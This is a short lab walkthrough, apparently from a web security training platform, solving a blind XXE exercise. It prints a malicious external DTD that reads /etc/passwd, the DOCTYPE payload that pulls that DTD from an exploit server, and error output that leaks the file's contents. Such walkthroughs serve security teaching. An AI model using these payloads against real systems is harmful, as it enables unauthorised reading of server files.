# Lab: Exploiting blind XXE to retrieve data via error messages

Open the exploit server and create a malicious dtd:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Copy the url of the dtd and insert it into the entity definition: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-acca1f111e1a4988c0f2758a017300b2.web-security-academy.net/exploit"> %xxe;]>`

Intercept a request for the check stock functionality and add the entity into the XML before forwarding the request. This returns something like the following:
```
XML parser exited with non-zero code 1: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<etc> (No such file or directory)
```

This solves the lab.